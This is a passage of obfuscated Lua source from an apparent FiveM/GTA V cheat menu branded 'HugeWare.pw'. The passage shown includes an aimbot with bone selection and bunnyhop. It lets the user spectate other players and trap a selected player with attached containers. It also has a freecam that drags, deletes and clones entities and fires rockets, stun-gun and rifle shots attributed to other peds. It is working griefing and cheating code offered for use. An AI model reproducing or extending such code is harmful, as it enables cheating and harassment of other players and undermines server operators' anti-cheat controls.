                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                container23,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                12.8,
                2.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                container24,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                12.8,
                0,
                0,
                90,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            --                                      CENTER BLOCK
            Citizen.Wait(50)
            AttachEntityToEntity(
                container25,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                8.4,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                container26,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                14.0,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
        end
    elseif HugeV.locals.current_tab == "Settings" then
        if BindButton_DSGUHSDIGHSDU("Open menu key: " .. OpenMenuKey["Label"], false, 0.35, 0.26) then
            local value, label = bind()
            OpenMenuKey["Label"] = label
            OpenMenuKey["Value"] = value
            DebugPrint("Changed open menu key to: " .. label, "SUCCES")
        end

        if SlimCheckbox("Can walk when menu opened", 0.36, 0.28, 0.28, HugeV.locals.can_walk_with_menu) then
            HugeV.locals.can_walk_with_menu = not HugeV.locals.can_walk_with_menu
        end

        if SlimCheckbox("Background", 0.36, 0.3, 0.3, HugeV.locals.background) then
            HugeV.locals.background = not HugeV.locals.background
        end

        if SlimCheckbox("Use Background Image", 0.36, 0.32, 0.32, HugeV.locals.UseBackgroundImage) then
            HugeV.locals.UseBackgroundImage = not HugeV.locals.UseBackgroundImage
        end

        if SlimCheckbox("System logs", 0.36, 0.34, 0.34, HugeV.locals.console) then
            HugeV.locals.console = not HugeV.locals.console
        end
    elseif HugeV.locals.current_tab == "No Menu" then
        text_szpachlan_szmata("~h~~r~No menu selected, select menu.", false, 0.35, 0, 0.415, 0.26)
    end
end

function drawMultipoint()
    if HugeV.locals.legit_aimbot then
        text_szpachlan_szmata("MULTIPOINT", false, 0.3, 0, 0.66, 0.28, 4)
        DrawRect(0.64, 0.5, 0.003, 0.48, 161, 161, 161, 255)

        if Bones_Button(HugeV.locals.SelectedBones["HEAD"], "HEAD", false, 0.68, 0.32) then
            if HugeV.locals.SelectedBones["HEAD"] then
                HugeV.locals.SelectedBones["HEAD"] = false
            else
                HugeV.locals.SelectedBones["HEAD"] = true
            end
        end

        if Bones_Button(HugeV.locals.SelectedBones["NECK"], "NECK", false, 0.68, 0.34) then
            if HugeV.locals.SelectedBones["NECK"] then
                HugeV.locals.SelectedBones["NECK"] = false
            else
                HugeV.locals.SelectedBones["NECK"] = true
            end
        end

        if Bones_Button(HugeV.locals.SelectedBones["R FOOT"], "RIGHT FOOT", false, 0.68, 0.36) then
            if HugeV.locals.SelectedBones["R FOOT"] then
                HugeV.locals.SelectedBones["R FOOT"] = false
            else
                HugeV.locals.SelectedBones["R FOOT"] = true
            end
        end

        if Bones_Button(HugeV.locals.SelectedBones["L FOOT"], "LEFT FOOT", false, 0.68, 0.38) then
            if HugeV.locals.SelectedBones["L FOOT"] then
                HugeV.locals.SelectedBones["L FOOT"] = false
            else
                HugeV.locals.SelectedBones["L FOOT"] = true
            end
        end

        if Bones_Button(HugeV.locals.SelectedBones["L FOREARM"], "LEFT FORE ARM", false, 0.68, 0.4) then
            if HugeV.locals.SelectedBones["L FOREARM"] then
                HugeV.locals.SelectedBones["L FOREARM"] = false
            else
                HugeV.locals.SelectedBones["L FOREARM"] = true
            end
        end

        if Bones_Button(HugeV.locals.SelectedBones["R FOREARM"], "RIGHT FORE ARM", false, 0.68, 0.42) then
            if HugeV.locals.SelectedBones["R FOREARM"] then
                HugeV.locals.SelectedBones["R FOREARM"] = false
            else
                HugeV.locals.SelectedBones["R FOREARM"] = true
            end
        end

        if Bones_Button(HugeV.locals.SelectedBones["R UPPER ARM"], "RIGHT UPPER ARM", false, 0.68, 0.44) then
            if HugeV.locals.SelectedBones["R UPPER ARM"] then
                HugeV.locals.SelectedBones["R UPPER ARM"] = false
            else
                HugeV.locals.SelectedBones["R UPPER ARM"] = true
            end
        end

        if Bones_Button(HugeV.locals.SelectedBones["L UPPER ARM"], "LEFT UPPER ARM", false, 0.68, 0.46) then
            if HugeV.locals.SelectedBones["L UPPER ARM"] then
                HugeV.locals.SelectedBones["L UPPER ARM"] = false
            else
                HugeV.locals.SelectedBones["L UPPER ARM"] = true
            end
        end
    end
end

function meni_gwegreh()
    ----------- MAIN ----------
    --SetMouseCursorSprite(8)
    text_szpachlan_szmata("HugeWare.pw", false, 0.25, 0, 0.665, 0.748)
    DrawRect(0.5, 0.5, 2.45, 2.5, 0, 0, 0, 200)

    if HugeV.locals.background then
        local color = RGB_Rainbow_DSUGSIDGSD(1.0)
        DrawRect(0.5, 0.5, 2.45, 2.5, 0, 0, 0, 200)
        DrawRect(0, 0.5, 0.01, 2.5, color.r, color.g, color.b, 255)
        DrawRect(1.0, 0.5, 0.01, 2.5, color.r, color.g, color.b, 255)
        DrawRect(0.5, 1.0, 2.5, 0.02, color.r, color.g, color.b, 255)
        DrawRect(0.5, 0, 2.5, 0.02, color.r, color.g, color.b, 255)
    end

    if HugeV.locals.console then
        if IsDisabledControlPressed(0, 15) then
            if HugeV.locals.scrool_console - 8 <= 15 then
                HugeV.locals.scrool_console = 15
            else
                HugeV.locals.scrool_console = HugeV.locals.scrool_console - 8
            end
        end

        if IsDisabledControlPressed(0, 14) then
            if 15 >= #HugeV.locals.console_wiadomosci then
                HugeV.locals.scrool_console = HugeV.locals.scrool_console
            else
                if HugeV.locals.scrool_console + 8 >= #HugeV.locals.console_wiadomosci then
                    HugeV.locals.scrool_console = #HugeV.locals.console_wiadomosci
                else
                    HugeV.locals.scrool_console = HugeV.locals.scrool_console + 8
                end
            end
        end
        for i = 1 + (HugeV.locals.scrool_console - 15), HugeV.locals.scrool_console do
            if HugeV.locals.console_wiadomosci[i] == nil then
            else
                text_szpachlan_szmata(
                    HugeV.locals.console_wiadomosci[i],
                    false,
                    0.2,
                    0,
                    0.01,
                    0.6 + (0.015 * (i - HugeV.locals.scrool_console))
                )
            end
        end

        textik_notify("System Logs Activated", false, 0.33, 0, 0.025, 0.34) -- jakby oddalanie przblizanie , nic , lewo prawo, gora dol
        DrawRect(0.13, 0.35, 0.25, 0.04, 13, 10, 39, 255)
        DrawRect(0.13, 0.5, 0.25, 0.24, 13, 10, 39, 200) -- lewo prawo , wysokosc, szerokosc od bokow, szerokosc od gory
        DrawSprite_HugeWare_SDGUHSFDIGDFG(
            "mpleaderboard",
            "leaderboard_deaths_icon",
            0.014,
            0.35,
            0.021,
            0.04,
            0.0,
            255,
            255,
            255,
            255
        ) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest RAGE )
    end

    DrawRect(0.5, 0.5, 0.45, 0.5, 13, 10, 39, 200) -- dul
    if HugeV.locals.UseBackgroundImage then
        DrawSprite("hugeware", "menu_gif", 0.5, 0.5, 0.45, 0.5, 0.0, 255, 255, 255, 150)
    end
    DrawRect(0.31, 0.5, 0.07, 0.5, 13, 10, 39, 255) -- pasek na lewo
    DrawRect(
        0.5,
        0.76,
        0.45,
        0.03,
        HugeV.menu_color.HugeWare_pw.r,
        HugeV.menu_color.HugeWare_pw.g,
        HugeV.menu_color.HugeWare_pw.b,
        255
    ) -- HugeWare.pw

    ----------- MAIN ----------

    LeftBar_GOre()

    tabs_grherher()
end

function DrawImpact(delay, x1, y1, z1, x2, y2, z2)
    table.insert(
        HugeV.locals.impacts,
        {
            ["x1"] = x1,
            ["y1"] = y1,
            ["z1"] = z1,
            ["x2"] = x2,
            ["y2"] = y2,
            ["z2"] = z2,
            ["delay"] = 5000,
            ["startTime_DSGISDOGSDG"] = Czitirzen_InvokeNative(0x9CD27B0045628463)
        }
    )
end

function DrawTrails(delay, x1, y1, z1)
    table.insert(
        HugeV.locals.trails_table,
        {
            ["x1"] = x1,
            ["y1"] = y1,
            ["z1"] = z1,
            ["delay"] = 1000,
            ["startTime_DSGISDOGSDG"] = Czitirzen_InvokeNative(0x9CD27B0045628463)
        }
    )
end

Citizen.CreateThread(
    function()
        while HugeV.locals.MenuEnabled do
            Citizen.Wait(0)
            if HugeV.locals.legit_aimbot and not HugeV.locals.Displayed then
                for i = 0, #HugeV.locals.ids do
                    if not HugeV.locals.ids[i] == HugeV.Player.LocalId then
                        if
                            IsEntityOnScreen(GetPlayerPed(HugeV.locals.ids[i])) and
                                not IsPedDeadOrDying(GetPlayerPed(HugeV.locals.ids[i])) and
                                IsDisabledControlPressed(1, HugeV.locals.keys["MOUSE1"]) and
                                IsDisabledControlPressed(1, HugeV.locals.keys["LEFTALT"])
                         then
                            local _, weapon_IDHIFUSDGFDG =
                                GetCurrentPedWeapon(Czitirzen_InvokeNative(0xD80958FC74E988A6))
                            aimbot_shoot(GetPlayerPed(HugeV.locals.ids[i]), "", GetWeaponDamage(weapon_IDHIFUSDGFDG, 1))
                        end
                    end
                end
            end
        end
    end
)

Citizen.CreateThread(
    function()
        while HugeV.locals.MenuEnabled do
            Citizen.Wait(0)
            if HugeV.locals.bunnyhop and not IsPedInAnyVehicle(HugeV.Player.PedId) then
                if IsDisabledControlPressed(1, HugeV.locals.keys["SPACE"]) then -- (chyba)
                    TaskJump(HugeV.Player.PedId, true)
                    Citizen.Wait(200)
                end
            end
        end
    end
)

Citizen.CreateThread(
    function()
        while HugeV.locals.MenuEnabled do
            Citizen.Wait(0)

            if HugeV.locals.CamInVeh and not HugeV.locals.Freecam and not HugeV.locals.Spectate then
                FreezeEntityPosition(HugeV.Player.PedId, true)
                local CamInVeh_cam = CamInVeh_cam
                if not CamInVeh_cam ~= nil then
                    CamInVeh_cam = CreateCam("DEFAULT_SCRIPTED_Camera", 1)
                end
                RenderScriptCams(1, 0, 0, 1, 1)
                SetCamActive(CamInVeh_cam, true)
                local coords_SSS = GetEntityCoords(HugeV.locals.SelectedVehicle)
                SetCamCoord(CamInVeh_cam, coords_SSS.x, coords_SSS.y, coords_SSS.z + 3)

                local offsetRotX = 0.0
                local offsetRotY = 0.0
                local offsetRotZ = 0.0

                DisableControlAction(0, 32, true) -- W
                DisableControlAction(0, 31, true) -- S
                DisableControlAction(0, 30, true) -- D
                DisableControlAction(0, 34, true) -- A

                local weapondelay = 0

                while DoesCamExist(CamInVeh_cam) do
                    Wait(0)
                    if not HugeV.locals.CamInVeh then
                        DestroyCam(CamInVeh_cam, false)
                        ClearTimecycleModifier()
                        RenderScriptCams(false, false, 0, 1, 0)
                        FreezeEntityPosition(HugeV.Player.PedId, false)
                        SetFocusEntity(HugeV.Player.PedId)
                        break
                    end

                    local VehicleEnt = HugeV.locals.SelectedVehicle
                    local VehicleRot = GetEntityRotation(VehicleEnt, 2)

                    local rotX = VehicleRot.x
                    local rotY = VehicleRot.y
                    local rotZ = VehicleRot.z

                    offsetRotX = offsetRotX - (GetDisabledControlNormal(1, 2) * 8.0)
                    offsetRotZ = offsetRotZ - (GetDisabledControlNormal(1, 1) * 8.0)

                    if (offsetRotX > 90.0) then
                        offsetRotX = 90.0
                    elseif (offsetRotX < -90.0) then
                        offsetRotX = -90.0
                    end

                    if (offsetRotY > 90.0) then
                        offsetRotY = 90.0
                    elseif (offsetRotY < -90.0) then
                        offsetRotY = -90.0
                    end

                    if (offsetRotZ > 360.0) then
                        offsetRotZ = offsetRotZ - 360.0
                    elseif (offsetRotZ < -360.0) then
                        offsetRotZ = offsetRotZ + 360.0
                    end

                    local x, y, z = table.unpack(GetCamCoord(CamInVeh_cam))
                    local coords_ES =
                        GetEntityCoords(HugeV.locals.SelectedVehicle) +
                        (RotationToDirection(GetCamRot(CamInVeh_cam, 2)) * (0.5 * 1.5))
                    if IsDisabledControlPressed(1, 44) then
                        z_CamInVeh_DSIGHIDS = z_CamInVeh_DSIGHIDS + 0.2
                    end

                    if IsDisabledControlPressed(1, 48) then
                        z_CamInVeh_DSIGHIDS = z_CamInVeh_DSIGHIDS - 0.2
                    end

                    SetCamCoord(CamInVeh_cam, coords_ES.x, coords_ES.y, coords_ES.z + 3 + z_CamInVeh_DSIGHIDS)

                    if not HugeV.locals.Displayed then
                        SetFocusArea(
                            GetCamCoord(CamInVeh_cam).x,
                            GetCamCoord(CamInVeh_cam).y,
                            GetCamCoord(CamInVeh_cam).z,
                            0.0,
                            0.0,
                            0.0
                        )
                        SetCamRot(CamInVeh_cam, offsetRotX, offsetRotY, offsetRotZ, 2)
                    end
                end
            end

            if HugeV.locals.Spectate and not HugeV.locals.Freecam and not HugeV.locals.CamInVeh then
                FreezeEntityPosition(HugeV.Player.PedId, true)
                local spectate_cam = spectate_cam
                if not spectate_cam ~= nil then
                    spectate_cam = CreateCam("DEFAULT_SCRIPTED_Camera", 1)
                end
                RenderScriptCams(1, 0, 0, 1, 1)
                SetCamActive(spectate_cam, true)
                local coords_SSS = GetEntityCoords(GetPlayerPed(HugeV.locals.SelectedPlayer))
                SetCamCoord(spectate_cam, coords_SSS.x, coords_SSS.y, coords_SSS.z + 3)

                local offsetRotX = 0.0
                local offsetRotY = 0.0
                local offsetRotZ = 0.0

                DisableControlAction(0, 32, true) -- W
                DisableControlAction(0, 31, true) -- S
                DisableControlAction(0, 30, true) -- D
                DisableControlAction(0, 34, true) -- A

                local weapondelay = 0

                while DoesCamExist(spectate_cam) do
                    Wait(0)
                    if not HugeV.locals.Spectate then
                        DestroyCam(spectate_cam, false)
                        ClearTimecycleModifier()
                        RenderScriptCams(false, false, 0, 1, 0)
                        FreezeEntityPosition(HugeV.Player.PedId, false)
                        SetFocusEntity(HugeV.Player.PedId)
                        break
                    end

                    local playerPed = GetPlayerPed(HugeV.locals.SelectedPlayer)
                    local playerRot = GetEntityRotation(playerPed, 2)

                    local rotX = playerRot.x
                    local rotY = playerRot.y
                    local rotZ = playerRot.z

                    offsetRotX = offsetRotX - (GetDisabledControlNormal(1, 2) * 8.0)
                    offsetRotZ = offsetRotZ - (GetDisabledControlNormal(1, 1) * 8.0)

                    if (offsetRotX > 90.0) then
                        offsetRotX = 90.0
                    elseif (offsetRotX < -90.0) then
                        offsetRotX = -90.0
                    end

                    if (offsetRotY > 90.0) then
                        offsetRotY = 90.0
                    elseif (offsetRotY < -90.0) then
                        offsetRotY = -90.0
                    end

                    if (offsetRotZ > 360.0) then
                        offsetRotZ = offsetRotZ - 360.0
                    elseif (offsetRotZ < -360.0) then
                        offsetRotZ = offsetRotZ + 360.0
                    end

                    local x, y, z = table.unpack(GetCamCoord(spectate_cam))
                    local coords_ES =
                        GetEntityCoords(GetPlayerPed(HugeV.locals.SelectedPlayer)) +
                        (RotationToDirection(GetCamRot(spectate_cam, 2)) * (0.5 * 1.5))

                    if IsDisabledControlPressed(1, 44) then
                        z_DSFHSUDGDS = z_DSFHSUDGDS + 0.2
                    end

                    if IsDisabledControlPressed(1, 48) then
                        z_DSFHSUDGDS = z_DSFHSUDGDS - 0.2
                    end

                    SetCamCoord(spectate_cam, coords_ES.x, coords_ES.y, coords_ES.z + 3 + z_DSFHSUDGDS)

                    if not HugeV.locals.Displayed then
                        SetFocusArea(
                            GetCamCoord(spectate_cam).x,
                            GetCamCoord(spectate_cam).y,
                            GetCamCoord(spectate_cam).z,
                            0.0,
                            0.0,
                            0.0
                        )
                        SetCamRot(spectate_cam, offsetRotX, offsetRotY, offsetRotZ, 2)
                    end
                end
            end

            if HugeV.locals.Freecam and not HugeV.locals.Spectate and not HugeV.locals.CamInVeh then
                if not HugeV.locals.Displayed then
                    local freecam_cam = freecam_cam
                    if not freecam_cam ~= nil then
                        freecam_cam = CreateCam("DEFAULT_SCRIPTED_Camera", 1)
                    end
                    RenderScriptCams(1, 0, 0, 1, 1)
                    SetCamActive(freecam_cam, true)
                    SetCamCoord(freecam_cam, GetEntityCoords(HugeV.Player.PedId))

                    local offsetRotX = 0.0
                    local offsetRotY = 0.0
                    local offsetRotZ = 0.0

                    DisableControlAction(0, 32, true) -- W
                    DisableControlAction(0, 31, true) -- S
                    DisableControlAction(0, 30, true) -- D
                    DisableControlAction(0, 34, true) -- A

                    local weapondelay = 0

                    while DoesCamExist(freecam_cam) do
                        Wait(0)
                        local freecam_cam_rot = GetCamRot(freecam_cam, 2)
                        local Markerloc = GetCamCoord(freecam_cam) + (RotationToDirection(freecam_cam_rot) * 10)
                        local currentmode = HugeV.locals.modes[HugeV.locals.tryb]
                        FreezeEntityPosition(HugeV.Player.PedId, true)
                        local coords = GetCamCoord(freecam_cam)
                        local rightVec, forwardVec, upVec = GetCamMatrix(freecam_cam)
                        local curVec = vector3(coords.x, coords.y, coords.z)
                        local targetVec = curVec + forwardVec * 150
                        local handle =
                            StartShapeTestRay(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1)
                        local _, hit, endCoords, _, entity_to_check = GetShapeTestResult(handle)
                        local entity = entity
                        if CheckEntity(entity_to_check) then
                            entity = entity_to_check
                        end
                        -- Entity Info --
                        if DoesEntityExist(entity) and DoesEntityHaveDrawable(entity) then
                            local coords = GetEntityCoords(entity)
                            local frozen = nil
                            if HugeV.locals.frozen_entities[entity] == nil then
                                HugeV.locals.frozen_entities[entity] = false
                            end

                            HugeV.locals.frozen_entities[HugeV.Player.PedId] = true

                            if entity == HugeV.locals.object_freecam then
                            else
                                DrawText3D_HugeV_UDGUYSDHUGSFFDG(
                                    coords.x,
                                    coords.y,
                                    coords.z,
                                    "Model: " ..
                                        GetEntityModel(entity) ..
                                            "\nPos: " ..
                                                ("x: %.2f, y: %.2f, z: %.2f"):format(coords.x, coords.y, coords.z) ..
                                                    "\nHealth: " ..
                                                        GetEntityHealth(entity) ..
                                                            "\nFrozen: " ..
                                                                tostring(HugeV.locals.frozen_entities[entity]),
                                    255,
                                    255,
                                    255
                                )
                            end
                        end

                        -- Crosshair --

                        if DoesEntityExist(entity) then
                            DrawRect(0.5, 0.5, 0.008, 0.001, 0, 255, 0, 255)
                            DrawRect(0.5, 0.5, 0.001, 0.014, 0, 255, 0, 255)
                        else
                            DrawRect(0.5, 0.5, 0.008, 0.001, 255, 255, 255, 255)
                            DrawRect(0.5, 0.5, 0.001, 0.014, 255, 255, 255, 255)
                        end

                        -- Entity dragging --
                        if DoesEntityExist(entity) then
                            if IsDisabledControlPressed(1, HugeV.locals.keys["MOUSE1"]) then
                                if entity == HugeV.locals.object_freecam then
                                else
                                    if not dragging then
                                        lastentity = entity
                                    end
                                end
                            end
                        end

                        if DoesEntityExist(lastentity) then
                            if IsDisabledControlPressed(1, HugeV.locals.keys["MOUSE1"]) and not HugeV.locals.Displayed then
                                dragging = true
                                SetEntityCoords(lastentity, Markerloc)
                                if IsDisabledControlPressed(1, 38) then -- E
                                    if HugeV.locals.freecam_entity_dragging_heading == nil then
                                        HugeV.locals.freecam_entity_dragging_heading =
                                            GetEntityHeading(HugeV.locals.freecam_entity_dragging_heading)
                                    end
                                    HugeV.locals.freecam_entity_dragging_heading =
                                        HugeV.locals.freecam_entity_dragging_heading + 1 + 0.0
                                    if HugeV.locals.freecam_entity_dragging_heading >= 360.0 then
                                        HugeV.locals.freecam_entity_dragging_heading = 0.0
                                    end
                                end

                                if IsDisabledControlPressed(1, 44) then -- Q
                                    if HugeV.locals.freecam_entity_dragging_heading == nil then
                                        HugeV.locals.freecam_entity_dragging_heading =
                                            GetEntityHeading(HugeV.locals.object_freecam)
                                    end
                                    HugeV.locals.freecam_entity_dragging_heading =
                                        HugeV.locals.freecam_entity_dragging_heading - 1 + 0.0
                                    if HugeV.locals.freecam_entity_dragging_heading <= 0.0 then
                                        HugeV.locals.freecam_entity_dragging_heading = 360.0
                                    end
                                end

                                SetEntityRotation(lastentity, freecam_cam_rot)
                                DrawBoundingBox(lastentity, 0, 255, 0, 50)
                                DrawRect(0.5, 0.5, 0.008, 0.001, 0, 255, 0, 255)
                                DrawRect(0.5, 0.5, 0.001, 0.014, 0, 255, 0, 255)
                            else
                                if not lastentity == HugeV.Player.PedId then
                                    FreezeEntityPosition(lastentity, false)
                                end
                                DrawBoundingBox(entity, 255, 255, 255, 50)
                                lastentity = nil
                            end
                        else
                            dragging = false
                            if entity == HugeV.locals.object_freecam then
                            else
                                DrawBoundingBox(entity, 255, 255, 255, 50)
                            end
                        end

                        -- Delete entity --
                        if DoesEntityExist(entity) then
                            if IsDisabledControlJustPressed(1, HugeV.locals.keys["HOME"]) then
                                if entity == HugeV.Player.PedId then
                                    DebugPrint("You cant delete your self")
                                elseif IsPedAPlayer(entity) then
                                    DebugPrint("You cant delete player")
                                else
                                    SetEntityAsMissionEntity(entity, true, true)
                                    DeleteVehicle(entity)
                                    DeleteEntity(entity)
                                end
                            end
                        end

                        -- Freeze entity --

                        if DoesEntityExist(entity) then
                            if IsDisabledControlJustPressed(1, HugeV.locals.keys["PAGEDOWN"]) then
                                if HugeV.locals.frozen_entities[entity] then
                                    HugeV.locals.frozen_entities[entity] = false
                                    FreezeEntityPosition(entity, false)
                                else
                                    HugeV.locals.frozen_entities[entity] = true
                                    FreezeEntityPosition(entity, true)
                                end
                            end
                        end

                        -- Clone Entity --

                        if DoesEntityExist(entity) then
                            if IsDisabledControlJustPressed(1, HugeV.locals.keys["C"]) then
                                if IsEntityAPed(entity) then
                                    local clone =
                                        CreatePed(
                                        4,
                                        GetEntityModel(entity),
                                        GetEntityCoords(entity),
                                        GetEntityHeading(entity),
                                        true,
                                        true
                                    )
                                    SetEntityRotation(clone, GetEntityRotation(entity, 2))
                                    HugeV.locals.frozen_entities[clone] = HugeV.locals.frozen_entities[entity]
                                    FreezeEntityPosition(clone, HugeV.locals.frozen_entities[clone])
                                    DebugPrint("Cloned ped: ~y~" .. entity, "INFO")
                                elseif IsEntityAVehicle(entity) then
                                    local clone =
                                        CreateVehicle(
                                        GetEntityModel(entity),
                                        GetEntityCoords(entity),
                                        GetEntityHeading(entity),
                                        true,
                                        true
                                    )
                                    SetEntityRotation(clone, GetEntityRotation(entity, 2))
                                    HugeV.locals.frozen_entities[clone] = HugeV.locals.frozen_entities[entity]
                                    FreezeEntityPosition(clone, HugeV.locals.frozen_entities[clone])
                                    DebugPrint("Cloned vehicle: ~y~" .. entity, "INFO")
                                elseif IsEntityAnObject(entity) then
                                    local clone =
                                        CreateObject(GetEntityModel(entity), GetEntityCoords(entity), true, true, true)
                                    SetEntityRotation(clone, GetEntityRotation(entity, 2))
                                    HugeV.locals.frozen_entities[clone] = HugeV.locals.frozen_entities[entity]
                                    FreezeEntityPosition(clone, HugeV.locals.frozen_entities[clone])
                                    DebugPrint("Cloned object: ~y~" .. entity, "INFO")
                                end
                            end
                        end

                        -- Shoot Rocket and other --

                        if currentmode == "Shoot" then
                            if IsDisabledControlJustPressed(1, HugeV.locals.keys["R"]) then
                                if HugeV.locals.peds[1] == PlayerPedId() then
                                    ShootSingleBulletBetweenCoords(
                                        GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot),
                                        Markerloc,
                                        0.0,
                                        false,
                                        GetHashKey("WEAPON_RPG"),
                                        HugeV.locals.peds[2],
                                        true,
                                        false,
                                        -1.0
                                    )
                                else
                                    ShootSingleBulletBetweenCoords(
                                        GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot),
                                        Markerloc,
                                        0.0,
                                        false,
                                        GetHashKey("WEAPON_RPG"),
                                        HugeV.locals.peds[1],
                                        true,
                                        false,
                                        -1.0
                                    )
                                end
                            end

                            if IsDisabledControlJustPressed(1, HugeV.locals.keys["MOUSE2"]) then
                                if HugeV.locals.peds[1] == PlayerPedId() then
                                    ShootSingleBulletBetweenCoords(
                                        GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot),
                                        Markerloc,
                                        0.0,
                                        false,
                                        GetHashKey("WEAPON_STUNGUN"),
                                        HugeV.locals.peds[2],
                                        true,
                                        false,
                                        -1.0
                                    )
                                else
                                    ShootSingleBulletBetweenCoords(
                                        GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot),
                                        Markerloc,
                                        0.0,
                                        false,
                                        GetHashKey("WEAPON_STUNGUN"),
                                        HugeV.locals.peds[1],
                                        true,
                                        false,
                                        -1.0
                                    )
                                end
                            end

                            if IsDisabledControlJustPressed(1, HugeV.locals.keys["Q"]) then
                                if HugeV.locals.peds[1] == PlayerPedId() then
                                    ShootSingleBulletBetweenCoords(
                                        GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot),
                                        Markerloc,
                                        0.0,
                                        false,
                                        GetHashKey("WEAPON_ASSAULTRIFLE"),
                                        HugeV.locals.peds[2],
                                        true,
                                        false,
                                        -1.0
                                    )
                                else
                                    ShootSingleBulletBetweenCoords(
                                        GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot),
                                        Markerloc,
                                        0.0,
                                        false,
                                        GetHashKey("WEAPON_ASSAULTRIFLE"),
                                        HugeV.locals.peds[1],
                                        true,
                                        false,
                                        -1.0
                                    )
                                end
                            end

                            if IsDisabledControlJustPressed(1, HugeV.locals.keys["X"]) then
                                if HugeV.locals.peds[1] == PlayerPedId() then
                                    ShootSingleBulletBetweenCoords(
                                        GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot),
                                        Markerloc,
                                        0.0,
                                        false,
                                        GetHashKey("WEAPON_FIREWORK"),
                                        HugeV.locals.peds[2],
                                        true,
                                        false,
                                        -1.0
                                    )
                                else
                                    ShootSingleBulletBetweenCoords(
                                        GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot),
                                        Markerloc,
                                        0.0,
                                        false,
                                        GetHashKey("WEAPON_FIREWORK"),
                                        HugeV.locals.peds[1],
                                        true,
                                        false,
                                        -1.0
                                    )
                                end
                            end
                        end

                        HugeV.locals.ObjectPreviev = true

                        if currentmode == "Create Objects" then
                            if HugeV.locals.ObjectPreviev then
                                if HugeV.locals.object_freecam == nil then
                                    HugeV.locals.object_freecam =
                                        CreateObject(GetHashKey("prop_container_hole"), Markerloc, true, false, true)
                                else
                                    if not IsDisabledControlPressed(1, 24) then
                                        SetEntityCoords(HugeV.locals.object_freecam, Markerloc)
                                        SetEntityVisible(HugeV.locals.object_freecam, false, false)
                                        SetEntityLocallyVisible(HugeV.locals.object_freecam)
                                        SetEntityAlpha(HugeV.locals.object_freecam, 150)
                                        SetEntityCollision(HugeV.locals.object_freecam, false, false)
                                        if IsDisabledControlPressed(1, 38) then -- E
                                            if HugeV.locals.freecam_object_heading == nil then
                                                HugeV.locals.freecam_object_heading =
                                                    GetEntityHeading(HugeV.locals.object_freecam)
                                            end
                                            HugeV.locals.freecam_object_heading =
                                                HugeV.locals.freecam_object_heading + 1 + 0.0
                                            if HugeV.locals.freecam_object_heading >= 360.0 then
                                                HugeV.locals.freecam_object_heading = 0.0
                                            end
                                        end

                                        if IsDisabledControlPressed(1, 44) then -- Q
                                            if HugeV.locals.freecam_object_heading == nil then
                                                HugeV.locals.freecam_object_heading =
                                                    GetEntityHeading(HugeV.locals.object_freecam)
                                            end
                                            HugeV.locals.freecam_object_heading =
                                                HugeV.locals.freecam_object_heading - 1 + 0.0
                                            if HugeV.locals.freecam_object_heading <= 0.0 then
                                                HugeV.locals.freecam_object_heading = 360.0
                                            end
                                        end
                                        SetEntityRotation(HugeV.locals.object_freecam, freecam_cam_rot)
                                        SetEntityHeading(
                                            HugeV.locals.object_freecam,
                                            HugeV.locals.freecam_object_heading
                                        )
                                    end
                                end
                            else
                                HugeV.locals.object_freecam = nil
                            end

                            if IsDisabledControlJustPressed(1, HugeV.locals.keys["MOUSE2"]) then
                                local object =
                                    CreateObject(GetHashKey("prop_container_hole"), Markerloc, true, false, true)
                                SetEntityHeading(object, HugeV.locals.freecam_object_heading)
                            end
                        else
                            SetEntityAsMissionEntity(HugeV.locals.object_freecam, true, true)
                            DeleteEntity(HugeV.locals.object_freecam)
                            HugeV.locals.object_freecam = nil
                        end

                        -------------------------------------------------------------------------------------------------------------------------------------------------
                        if not HugeV.locals.Freecam then
                            DestroyCam(freecam_cam, false)
                            ClearTimecycleModifier()
                            RenderScriptCams(false, false, 0, 1, 0)
                            FreezeEntityPosition(HugeV.Player.PedId, false)
                            SetFocusEntity(HugeV.Player.PedId)
                            break
                        end
                        if not HugeV.locals.Displayed then
                            local playerPed = HugeV.Player.PedId
                            local playerRot = GetEntityRotation(playerPed, 2)

                            local rotX = playerRot.x
                            local rotY = playerRot.y
                            local rotZ = playerRot.z

                            offsetRotX = offsetRotX - (GetDisabledControlNormal(1, 2) * 8.0)
                            offsetRotZ = offsetRotZ - (GetDisabledControlNormal(1, 1) * 8.0)

                            if (offsetRotX > 90.0) then
                                offsetRotX = 90.0
                            elseif (offsetRotX < -90.0) then
                                offsetRotX = -90.0
                            end

                            if (offsetRotY > 90.0) then
                                offsetRotY = 90.0
                            elseif (offsetRotY < -90.0) then
                                offsetRotY = -90.0
                            end

                            if (offsetRotZ > 360.0) then
                                offsetRotZ = offsetRotZ - 360.0
                            elseif (offsetRotZ < -360.0) then
                                offsetRotZ = offsetRotZ + 360.0
                            end

                            local x, y, z = table.unpack(GetCamCoord(freecam_cam))
                            if IsDisabledControlPressed(1, 32) then -- W
                                if IsDisabledControlPressed(1, 21) then
                                    SetCamCoord(
                                        freecam_cam,
                                        GetCamCoord(freecam_cam) + (RotationToDirection(freecam_cam_rot) * (0.5 * 3.5))
                                    )
                                else
